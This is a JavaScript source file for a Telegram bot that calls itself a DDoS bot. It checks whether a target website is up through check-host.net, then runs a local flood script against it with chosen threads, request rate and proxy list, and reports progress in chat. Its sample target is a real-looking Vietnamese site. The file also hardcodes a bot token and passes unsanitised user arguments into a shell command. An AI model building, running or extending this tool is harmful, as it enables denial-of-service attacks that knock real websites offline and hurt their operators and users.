const { Telegraf } = require('telegraf');
const { exec } = require('child_process');
const fs = require('fs');
const os = require('os');
const axios = require('axios');

// ===== CONFIG =====
const BOT_TOKEN = '8385896572:AAE9MGGo4uLULy_l_dBLrdiZL88q3BPsd4I';
const ALLOWED_USERS = ['7054270031'];
const SCRIPT_PATH = './tls.js';
const CHECK_HOST_API = 'https://check-host.net/check-http';
const CHECK_HOST_WEB = 'https://check-host.net';

// ===== KHỞI TẠO BOT =====
const bot = new Telegraf(BOT_TOKEN);

// ===== STATE =====
let attackProcess = null;
let isAttacking = false;
let currentTarget = null;

// ===== HÀM LOG =====
function log(msg) {
    console.log(`[${new Date().toLocaleString()}] ${msg}`);
}

// ===== TẠO LINK CHECK-HOST CHUẨN =====
function createCheckHostLink(targetUrl) {
    try {
        const parsed = new URL(targetUrl);
        const domain = parsed.hostname;
        const protocol = parsed.protocol.replace(':', '');
        const port = parsed.port || (protocol === 'https' ? 443 : 80);
        
        return `${CHECK_HOST_WEB}/check-http?host=${domain}&max_nodes=10&http=true&timeout=10&port=${port}&protocol=${protocol}`;
    } catch {
        return null;
    }
}

function getCheckHostDisplayUrl(targetUrl) {
    try {
        const parsed = new URL(targetUrl);
        return `${CHECK_HOST_WEB}/check-http?host=${parsed.hostname}&max_nodes=10&http=true&timeout=10`;
    } catch {
        return null;
    }
}

// ===== HÀM CHECK HOST =====
async function checkHost(targetUrl) {
    try {
        const parsed = new URL(targetUrl);
        const domain = parsed.hostname;
        const port = parsed.port || (parsed.protocol === 'https:' ? 443 : 80);
        const protocol = parsed.protocol.replace(':', '');
        
        const response = await axios.get(CHECK_HOST_API, {
            params: {
                host: domain,
                max_nodes: 10,
                http: true,
                timeout: 10,
                port: port,
                protocol: protocol
            },
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            },
            timeout: 30000
        });

        const requestId = response.data.request_id;
        
        let attempts = 0;
        let result = null;
        
        while (attempts < 15) {
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            const statusResponse = await axios.get(`https://check-host.net/check-http/${requestId}`, {
                timeout: 10000
            });
            
            const data = statusResponse.data;
            const nodes = Object.keys(data);
            let aliveCount = 0;
            let totalCount = 0;
            let details = [];
            let statusCodes = [];
            
            for (const node of nodes) {
                if (data[node] && data[node].length > 0) {
                    totalCount++;
                    const check = data[node][0];
                    if (check && check.status && check.status.code < 400) {
                        aliveCount++;
                        details.push(`✅ ${node}: ${check.status.code} (${check.response_time}ms)`);
                        statusCodes.push(check.status.code);
                    } else if (check) {
                        details.push(`❌ ${node}: ${check.status ? check.status.code : 'TIMEOUT'}`);
                    } else {
                        details.push(`❌ ${node}: KHÔNG PHẢN HỒI`);
                    }
                }
            }
            
            if (totalCount > 0) {
                result = {
                    alive: aliveCount,
                    total: totalCount,
                    alivePercent: ((aliveCount / totalCount) * 100).toFixed(1),
                    details: details.slice(0, 8),
                    requestId: requestId,
                    statusCodes: statusCodes
                };
                break;
            }
            
            attempts++;
        }
        
        return result || {
            alive: 0,
            total: 0,
            alivePercent: '0',
            details: ['⏳ Hết thời gian chờ'],
            requestId: requestId,
            statusCodes: []
        };
        
    } catch (error) {
        log(`Check-host error: ${error.message}`);
        return {
            alive: 0,
            total: 0,
            alivePercent: '0',
            details: [`❌ Lỗi: ${error.message}`],
            requestId: null,
            statusCodes: []
        };
    }
}

// ===== LỆNH /START =====
bot.start((ctx) => {
    const userId = ctx.from.id.toString();
    if (!ALLOWED_USERS.includes(userId)) {
        return ctx.reply('⛔ Mày ko có quyền.');
    }
    ctx.reply(
        `🔥 DEVILS WILL RISE - DDoS BOT v4.7 🔥\n` +
        `Owner: @tpmodz\n` +
        `Channel: @tpmodz\n\n` +
        `📌 Lệnh:\n` +
        `/check <url>\n` +
        `/attack <method> <url> <time> <threads> <rate> <proxyfile>\n` +
        `/stop\n` +
        `/status\n` +
        `/help`
    );
});

// ===== LỆNH /HELP =====
bot.help((ctx) => {
    ctx.reply(
        `🧠 HƯỚNG DẪN\n\n` +
        `/check <url> - Check host\n` +
        `/attack <method> <url> <time> <threads> <rate> <proxyfile> [options]\n` +
        `/stop - Dừng attack\n` +
        `/status - Xem trạng thái\n\n` +
        `VD: /attack GET https://bia333.vn 120 30 500 proxy.txt --http 2 --winter`
    );
});

// ===== LỆNH /CHECK =====
bot.command('check', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!ALLOWED_USERS.includes(userId)) {
        return ctx.reply('⛔ Mày ko có quyền.');
    }

    const args = ctx.message.text.split(' ');
    args.shift();
    
    if (args.length < 1) {
        return ctx.reply('❌ Cần URL. VD: /check https://bia333.vn');
    }

    let targetUrl = args[0];
    
    if (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://')) {
        targetUrl = 'https://' + targetUrl;
    }
    
    try {
        new URL(targetUrl);
    } catch {
        return ctx.reply('❌ URL không hợp lệ.');
    }

    await ctx.reply(`🔍 Đang check ${targetUrl}...`);

    const result = await checkHost(targetUrl);
    const webLink = createCheckHostLink(targetUrl);
    const displayLink = getCheckHostDisplayUrl(targetUrl);
    
    let message = `📊 KẾT QUẢ CHECK HOST\n`;
    message += `🎯 ${targetUrl}\n`;
    message += `📈 Tỷ lệ sống: ${result.alivePercent}% (${result.alive}/${result.total})\n\n`;
    
    if (result.statusCodes.length > 0) {
        const uniqueStatus = [...new Set(result.statusCodes)];
        message += `📊 Status codes: ${uniqueStatus.join(', ')}\n\n`;
    }
    
    message += `📋 CHI TIẾT:\n`;
    message += result.details.slice(0, 6).join('\n');
    
    if (webLink) {
        message += `\n\n🔗 LINK CHECK-HOST (FULL):\n${webLink}`;
    }
    
    if (displayLink && displayLink !== webLink) {
        message += `\n\n🔗 LINK NGẮN:\n${displayLink}`;
    }

    await ctx.reply(message);
});

// ===== LỆNH /ATTACK =====
bot.command('attack', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!ALLOWED_USERS.includes(userId)) {
        return ctx.reply('⛔ Mày ko có quyền.');
    }

    if (isAttacking) {
        return ctx.reply('⚠️ Đang có attack. Dùng /stop.');
    }

    const args = ctx.message.text.split(' ');
    args.shift();

    if (args.length < 6) {
        return ctx.reply(
            `❌ Thiếu tham số.\n` +
            `/attack <method> <url> <time> <threads> <rate> <proxyfile> [options]\n` +
            `VD: /attack GET https://bia333.vn 120 30 500 proxy.txt --http 2 --winter`
        );
    }

    const method = args[0];
    let url = args[1];
    const time = args[2];
    const threads = args[3];
    const rate = args[4];
    const proxyfile = args[5];
    const options = args.slice(6).join(' ');

    if (!url.startsWith('http://') && !url.startsWith('https://')) {
        url = 'https://' + url;
    }

    if (!fs.existsSync(proxyfile)) {
        return ctx.reply(`❌ File proxy "${proxyfile}" ko tồn tại!`);
    }
    if (!fs.existsSync(SCRIPT_PATH)) {
        return ctx.reply(`❌ File flood "${SCRIPT_PATH}" ko tìm thấy!`);
    }

    currentTarget = url;

    const checkLink = createCheckHostLink(url);
    const displayLink = getCheckHostDisplayUrl(url);
    
    await ctx.reply(`🔍 Đang check ${url}...`);

    const checkResult = await checkHost(url);
    const alivePercent = parseFloat(checkResult.alivePercent);

    let checkMsg = `📊 CHECK TRƯỚC KHI ATTACK\n`;
    checkMsg += `🎯 ${url}\n`;
    checkMsg += `📈 Tỷ lệ sống: ${checkResult.alivePercent}%\n`;
    checkMsg += `✅ Sống: ${checkResult.alive}/${checkResult.total}\n\n`;
    
    if (checkResult.statusCodes.length > 0) {
        const uniqueStatus = [...new Set(checkResult.statusCodes)];
        checkMsg += `📊 Status: ${uniqueStatus.join(', ')}\n\n`;
    }
    
    if (checkLink) {
        checkMsg += `🔗 LINK CHECK-HOST (FULL):\n${checkLink}\n\n`;
    }
    
    if (displayLink && displayLink !== checkLink) {
        checkMsg += `🔗 LINK NGẮN:\n${displayLink}\n\n`;
    }
    
    if (checkResult.requestId) {
        checkMsg += `🔍 KẾT QUẢ TRỰC TIẾP:\n${CHECK_HOST_WEB}/check-http/${checkResult.requestId}\n\n`;
    }

    if (alivePercent >= 50) {
        checkMsg += `✅ Target đang sống, bắt đầu tấn công! 💀`;
    } else if (alivePercent >= 20) {
        checkMsg += `⚠️ Target yếu, vẫn đánh được.`;
    } else {
        checkMsg += `☠️ Target chết, nhưng tao vẫn đánh!`;
    }
    
    await ctx.reply(checkMsg);

    const cmd = `node ${SCRIPT_PATH} ${method} "${url}" ${time} ${threads} ${rate} ${proxyfile} ${options}`;
    log(`[START] ${cmd}`);

    await ctx.reply(
        `🔥 BẮT ĐẦU TẤN CÔNG\n` +
        `📌 ${url}\n` +
        `⏱ ${time}s | 🧵 ${threads} | 🚀 ${rate} req/s\n` +
        `📁 ${proxyfile}\n\n` +
        `Dùng /status | /stop`
    );

    isAttacking = true;
    attackProcess = exec(cmd, { maxBuffer: 1024 * 1024 * 10 });

    attackProcess.stdout.on('data', (data) => {
        const lines = data.toString().split('\n').filter(l => l.trim());
        for (const line of lines) {
            if (line.includes('STATUS') || line.includes('RPS') || line.includes('GOAWAY')) {
                ctx.telegram.sendMessage(ctx.chat.id, `📊 ${line.substring(0, 200)}`);
            }
        }
    });

    attackProcess.stderr.on('data', (data) => {
        log(`[STDERR] ${data}`);
    });

    attackProcess.on('exit', (code) => {
        isAttacking = false;
        attackProcess = null;
        log(`[EXIT] Attack stopped with code ${code}`);
        
        const finalLink = createCheckHostLink(url);
        let finalMsg = `⏹ Tấn công kết thúc. (code: ${code})\n\n`;
        if (finalLink) {
            finalMsg += `🔗 KIỂM TRA TARGET SAU ATTACK:\n${finalLink}`;
        }
        ctx.telegram.sendMessage(ctx.chat.id, finalMsg);
    });

    setTimeout(() => {
        if (isAttacking) stopAttack(ctx);
    }, (parseInt(time) + 5) * 1000);
});

// ===== LỆNH /CHECKNOW =====
bot.command('checknow', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!ALLOWED_USERS.includes(userId)) {
        return ctx.reply('⛔ Mày ko có quyền.');
    }

    if (!currentTarget) {
        return ctx.reply('⚠️ Chưa có target. Dùng /attack trước.');
    }

    const checkLink = createCheckHostLink(currentTarget);
    const displayLink = getCheckHostDisplayUrl(currentTarget);
    
    let msg = `🔗 LINK CHECK-HOST CHO ${currentTarget}:\n\n`;
    if (checkLink) {
        msg += `FULL LINK:\n${checkLink}\n\n`;
    }
    if (displayLink && displayLink !== checkLink) {
        msg += `LINK NGẮN:\n${displayLink}`;
    }
    
    await ctx.reply(msg);
});

// ===== LỆNH /STOP =====
bot.command('stop', async (ctx) => {
    const userId = ctx.from.id.toString();
    if (!ALLOWED_USERS.includes(userId)) {
        return ctx.reply('⛔ Mày ko có quyền.');
    }
    stopAttack(ctx);
});

function stopAttack(ctx) {
    if (!isAttacking || !attackProcess) {
        return ctx.reply('⚠️ Ko có attack nào đang chạy.');
    }
    attackProcess.kill('SIGINT');
    isAttacking = false;
    attackProcess = null;
    ctx.reply('🛑 Đã dừng tấn công!');
} // <--- ĐÂY LÀ DẤU } DUY NHẤT CHO HÀM NÀY

// ===== LỆNH /STATUS =====
bot.command('status', (ctx) => {
    const userId = ctx.from.id.toString();
    if (!ALLOWED_USERS.includes(userId)) {
        return ctx.reply('⛔ Mày ko có quyền.');
    }

    const status = isAttacking ? '🟢 ĐANG TẤN CÔNG' : '🔴 DỪNG';
    const memUsage = ((1 - os.freemem() / os.totalmem()) * 100).toFixed(1);
    ctx.reply(
        `📊 TRẠNG THÁI\n` +
        `Trạng thái: ${status}\n` +
        `Target: ${currentTarget || 'N/A'}\n` +
        `RAM: ${memUsage}%\n` +
        `CPU: ${os.cpus().length} cores\n` +
        `PID: ${attackProcess ? attackProcess.pid : 'N/A'}\n` +
        `Uptime: ${Math.floor(process.uptime())}s`
    );
});

// ===== LỆNH /RELOAD =====
bot.command('reload', (ctx) => {
    const userId = ctx.from.id.toString();
    if (!ALLOWED_USERS.includes(userId)) {
        return ctx.reply('⛔ Mày ko có quyền.');
    }

    const proxyFile = ctx.message.text.split(' ')[1] || 'proxies.txt';
    if (!fs.existsSync(proxyFile)) {
        return ctx.reply(`❌ File ${proxyFile} ko tồn tại.`);
    }

    const proxies = fs.readFileSync(proxyFile, 'utf8').split('\n').filter(p => p.trim());
    ctx.reply(`✅ Đã tải lại: ${proxies.length} proxy từ ${proxyFile}`);
});

// ===== CHẠY BOT =====
bot.launch().then(() => {
    log('🔥 Telegram Bot v4.7 đã khởi động!');
    log(`📌 Bot: https://t.me/${bot.botInfo.username}`);
}).catch(err => {
    log(`❌ Lỗi: ${err.message}`);
});

process.once('SIGINT', () => {
    if (attackProcess) attackProcess.kill('SIGINT');
    bot.stop('SIGINT');
    process.exit(0);
});
process.once('SIGTERM', () => {
    if (attackProcess) attackProcess.kill('SIGTERM');
    bot.stop('SIGTERM');
    process.exit(0);
});